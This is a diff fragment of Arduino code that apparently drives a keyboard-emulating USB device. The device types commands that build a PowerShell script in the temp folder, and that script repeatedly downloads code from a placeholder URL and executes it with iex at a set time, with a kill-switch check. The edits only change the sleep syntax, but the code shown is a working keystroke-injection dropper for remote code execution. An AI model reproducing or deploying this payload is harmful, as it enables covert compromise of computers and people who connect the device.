@@ -17,14 +17,14 @@ void setup(){
   Keyboard.println("echo $pass = \"INPUT2\" >> %temp%\\te.ps1");
   Keyboard.println("echo $dev = \"INPUT3\" >> %temp%\\te.ps1");
   Keyboard.println("echo while(1) { $exec = 0 >> %temp%\\te.ps1");
-  Keyboard.println("echo sleep -seconds 20 >> %temp%\\te.ps1");
+  Keyboard.println("echo sleep 20 >> %temp%\\te.ps1");
   Keyboard.println("echo $wc = New-Object System.Net.WebClient >> %temp%\\te.ps1");
   Keyboard.println("echo $fc = $wc.DownloadString(\"INPUT5\") >> %temp%\\te.ps1");
   Keyboard.println("echo $a = Get-Date -UFormat %R >> %temp%\\te.ps1");
   Keyboard.println("echo if ($a -match \"INPUT4\"){ >> %temp%\\te.ps1");
   Keyboard.println("echo iex ($wc.DownloadString(\"INPUT5\")); >> %temp%\\te.ps1");
   Keyboard.println("echo $exec++  >> %temp%\\te.ps1");
-  Keyboard.println("echo if ($exec -eq 1){ sleep -Seconds 60 }}  >> %temp%\\te.ps1");
+  Keyboard.println("echo if ($exec -eq 1){ sleep 60 }}  >> %temp%\\te.ps1");
   Keyboard.println("echo if ($fc -eq \"INPUT6\"){ break }} >> %temp%\\te.ps1");
  
 
